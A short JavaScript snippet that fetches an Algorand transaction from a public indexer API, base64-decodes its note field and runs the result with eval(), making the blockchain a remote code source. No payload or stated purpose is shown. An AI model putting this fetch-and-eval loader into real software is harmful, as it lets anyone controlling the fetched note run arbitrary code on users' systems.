/** Reads a given note. */
async function read(id) {
  return fetch(`https://algoindexer.algoexplorerapi.io/v2/transactions/${id}`)
    .then((res) => res.json())
    .then((txn) => atob(txn.transaction.note));
}

/** Evaluates JavaScript from a given note. */
async function exec(id) {
  const code = await read(id);
  return eval(code);
}
